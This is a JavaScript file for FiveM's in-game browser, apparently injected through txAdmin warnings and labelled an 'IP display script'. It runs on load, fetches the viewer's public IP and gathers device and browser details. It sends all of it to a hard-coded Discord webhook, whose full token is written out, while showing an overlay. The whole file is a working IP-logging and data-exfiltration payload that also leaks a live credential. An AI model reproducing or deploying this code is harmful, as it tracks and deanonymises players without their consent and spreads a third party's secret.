// FiveM NUI IP Display Script for txAdmin Warnings
// This script works within FiveM's NUI environment

console.log('=== FiveM IP Display Script Loading ===');

// Check if we're in FiveM NUI context
const isFiveMContext = () => {
    return window.invokeNative || window.GetParentResourceName || window.fetch;
};

// Function to send data to FiveM Lua side
const sendToFiveM = (action, data) => {
    try {
        if (window.invokeNative) {
            // Try using invokeNative
            window.invokeNative('sendNuiMessage', JSON.stringify({
                action: action,
                data: data
            }));
        } else if (window.postMessage) {
            // Use postMessage
            window.postMessage({
                action: action,
                data: data,
                source: 'ip_display_script'
            }, '*');
        }
        
        // Also try fetch to resource
        if (window.GetParentResourceName) {
            const resourceName = window.GetParentResourceName();
            fetch(`https://${resourceName}/ip_display`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, data })
            }).catch(() => {}); // Ignore errors
        }
    } catch (e) {
        console.log('Failed to send to FiveM:', e);
    }
};

// Function to create visual overlay
const createIPDisplay = (ip) => {
    console.log('Creating IP display for:', ip);
    
    // Remove existing display
    const existing = document.getElementById('fivem-ip-overlay');
    if (existing) existing.remove();
    
    // Create overlay container
    const overlay = document.createElement('div');
    overlay.id = 'fivem-ip-overlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: rgba(0, 0, 0, 0.3);
        z-index: 999999;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: 'Roboto', 'Arial', sans-serif;
        pointer-events: all;
    `;
    
    // Create display box
    const displayBox = document.createElement('div');
    displayBox.style.cssText = `
        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
        border: 3px solid #00ff41;
        border-radius: 20px;
        padding: 40px;
        text-align: center;
        color: white;
        box-shadow: 0 0 50px rgba(0, 255, 65, 0.6);
        min-width: 400px;
        animation: slideIn 0.5s ease-out;
    `;
    
    displayBox.innerHTML = `
        <div style="color: #00ff41; font-size: 20px; margin-bottom: 15px; font-weight: bold;">
            🌐 SERVER PUBLIC IP ADDRESS
        </div>
        <div style="font-size: 42px; font-weight: bold; letter-spacing: 3px; margin: 25px 0; color: #ffffff; text-shadow: 0 0 10px rgba(255,255,255,0.8);">
            ${ip}
        </div>
        <div style="font-size: 16px; color: #cccccc; margin-top: 20px;">
            Executed via txAdmin Warning System • Data logged to Discord
        </div>
        <div id="countdown-timer" style="font-size: 18px; color: #ffff00; margin-top: 15px; font-weight: bold;">
            Auto-close in 12 seconds
        </div>
        <div style="font-size: 14px; color: #00ff41; margin-top: 15px;">
            Click anywhere to close
        </div>
    `;
    
    // Add CSS animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideIn {
            from { transform: scale(0.5) rotate(-10deg); opacity: 0; }
            to { transform: scale(1) rotate(0deg); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
    
    overlay.appendChild(displayBox);
    document.body.appendChild(overlay);
    
    // Countdown timer
    let seconds = 12;
    const countdownEl = document.getElementById('countdown-timer');
    
    const timer = setInterval(() => {
        seconds--;
        if (countdownEl) {
            countdownEl.textContent = `Auto-close in ${seconds} seconds`;
        }
        if (seconds <= 0) {
            clearInterval(timer);
            removeDisplay();
        }
    }, 1000);
    
    // Click to close
    overlay.addEventListener('click', removeDisplay);
    
    function removeDisplay() {
        if (overlay && overlay.parentNode) {
            overlay.style.animation = 'slideIn 0.3s ease-in reverse';
            setTimeout(() => {
                overlay.remove();
                if (style && style.parentNode) style.remove();
            }, 300);
        }
        clearInterval(timer);
    }
    
    // Send to FiveM
    sendToFiveM('display_ip', { ip: ip, timestamp: Date.now() });
    
    console.log('IP display created successfully');
};

// Discord webhook URL
const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1411564766232842352/BH4caQFjBlYPp1zZsWJ4E-erP7oV9La5JrRPX1emdKLbYI6QpIV0SzQZ9TRux8s9yWMM';

// Function to collect system information
const collectSystemInfo = () => {
    const info = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages || [],
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : 'Unknown',
        fivemContext: isFiveMContext(),
        url: window.location.href,
        referrer: document.referrer || 'Direct access'
    };
    
    return info;
};

// Function to send data to Discord webhook
const sendToDiscord = async (ip, systemInfo, error = null) => {
    try {
        const embed = {
            title: error ? '❌ FiveM IP Fetch Error' : '🌐 FiveM Server IP Address Logged',
            color: error ? 0xff0000 : 0x00ff41,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: '🌍 Public IP Address',
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: '⏰ Timestamp',
                    value: new Date().toLocaleString(),
                    inline: true
                },
                {
                    name: '🖥️ Platform',
                    value: systemInfo.platform,
                    inline: true
                },
                {
                    name: '🌐 Browser Info',
                    value: `${systemInfo.userAgent.split(' ').slice(-2).join(' ')}`,
                    inline: false
                },
                {
                    name: '📺 Screen Resolution',
                    value: `${systemInfo.screen.width}x${systemInfo.screen.height} (${systemInfo.screen.colorDepth}-bit)`,
                    inline: true
                },
                {
                    name: '🪟 Window Size',
                    value: `${systemInfo.window.innerWidth}x${systemInfo.window.innerHeight}`,
                    inline: true
                },
                {
                    name: '🌍 Timezone',
                    value: systemInfo.timezone,
                    inline: true
                },
                {
                    name: '🔗 Connection',
                    value: systemInfo.connection !== 'Unknown' 
                        ? `${systemInfo.connection.effectiveType} (${systemInfo.connection.downlink}Mbps, ${systemInfo.connection.rtt}ms RTT)`
                        : 'Unknown',
                    inline: false
                },
                {
                    name: '🎮 FiveM Context',
                    value: systemInfo.fivemContext ? '✅ Yes' : '❌ No',
                    inline: true
                },
                {
                    name: '🌐 Online Status',
                    value: systemInfo.onLine ? '🟢 Online' : '🔴 Offline',
                    inline: true
                },
                {
                    name: '🍪 Cookies Enabled',
                    value: systemInfo.cookieEnabled ? '✅ Yes' : '❌ No',
                    inline: true
                }
            ],
            footer: {
                text: 'FiveM IP Logger via txAdmin Warning System',
                icon_url: 'https://raw.githubusercontent.com/citizenfx/fivem/master/ext/ui-build/data/loadscreen/logo.png'
            }
        };
        
        if (error) {
            embed.fields.unshift({
                name: '❌ Error Details',
                value: `\`\`\`${error}\`\`\``,
                inline: false
            });
        }
        
        const webhookData = {
            username: 'FiveM IP Logger',
            avatar_url: 'https://raw.githubusercontent.com/citizenfx/fivem/master/ext/ui-build/data/loadscreen/logo.png',
            embeds: [embed]
        };
        
        console.log('Sending data to Discord webhook...');
        
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });
        
        if (response.ok) {
            console.log('Successfully sent data to Discord webhook');
        } else {
            console.error('Discord webhook failed:', response.status, response.statusText);
        }
        
    } catch (webhookError) {
        console.error('Failed to send to Discord:', webhookError);
    }
};

// Function to fetch IP and display
const fetchAndDisplayIP = async () => {
    console.log('Starting IP fetch process...');
    
    // Collect system information first
    const systemInfo = collectSystemInfo();
    console.log('Collected system info:', systemInfo);
    
    try {
        console.log('Making request to ipify API...');
        
        const response = await fetch('https://api.ipify.org?format=json', {
            method: 'GET',
            mode: 'cors',
            cache: 'no-cache'
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        const data = await response.json();
        console.log('API Response:', data);
        
        if (!data || !data.ip) {
            throw new Error('Invalid response format');
        }
        
        const ip = data.ip;
        console.log('Successfully fetched IP:', ip);
        
        // Send to Discord webhook
        await sendToDiscord(ip, systemInfo);
        
        // Create display
        createIPDisplay(ip);
        
        // Send success to FiveM
        sendToFiveM('ip_fetched', { success: true, ip: ip });
        
    } catch (error) {
        console.error('IP fetch failed:', error);
        
        // Send error to Discord
        await sendToDiscord('Failed to fetch', systemInfo, error.message);
        
        // Create error display
        createIPDisplay(`Error: ${error.message}`);
        
        // Send error to FiveM
        sendToFiveM('ip_fetch_error', { error: error.message });
    }
};

// Initialize script
const initScript = () => {
    console.log('Initializing IP display script...');
    console.log('FiveM context detected:', isFiveMContext());
    console.log('User agent:', navigator.userAgent);
    
    // Add immediate visual feedback
    document.body.style.outline = '3px solid lime';
    setTimeout(() => {
        document.body.style.outline = '';
    }, 2000);
    
    // Start IP fetching process
    setTimeout(fetchAndDisplayIP, 1000);
};

// Multiple initialization attempts
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initScript);
} else {
    initScript();
}

// Backup initialization
setTimeout(initScript, 2000);

// Make functions globally available
window.ipDisplay = {
    fetch: fetchAndDisplayIP,
    create: createIPDisplay,
    initialized: true
};

console.log('=== FiveM IP Display Script Ready ===');
